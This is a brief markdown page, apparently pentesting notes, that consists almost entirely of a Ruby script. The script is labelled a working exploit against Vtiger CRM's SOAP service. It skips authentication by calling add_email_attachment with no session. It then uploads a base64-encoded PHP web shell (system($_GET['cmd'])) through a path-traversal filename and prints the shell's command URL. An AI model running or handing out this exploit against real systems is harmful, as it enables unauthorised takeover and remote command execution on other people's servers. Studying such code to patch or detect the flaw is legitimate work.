# Web Services

### SOAP - WSDL

```
gem install savon httpclient
```


This is a working exploit for Vtiger CRM SOAP from Auth-bypass to Shell upload 
```ruby
#!/usr/bin/evn ruby
#
# KING SABRI
# gem install savon httpclient
#
require 'savon'

if ARGV.size < 1
  puts "[+] ruby #{__FILE__} [WSDL URL]"
  exit 0
else
  url = ARGV[0]
end

shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.php"

# Start client 
client = Savon::Client.new(wsdl: url)

# List all avialable operations 
puts "[*] List all available operations "
puts client.operations

puts "\n\n[*] Interact with :add_email_attachment operation"
response = client.call( :add_email_attachment, 
                        message: {
                                     emailid:  rand(100),
                                     filedata: [shell_data].pack("m0"),
                                     filename: "../../../../../../#{shell_name}",
                                     filesize: shell_data.size,
                                     filetype: "php",
                                     username: "KING", 
                                     sessionid: nil
                                }
                     )
puts "[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_name}?cmd=id"

```
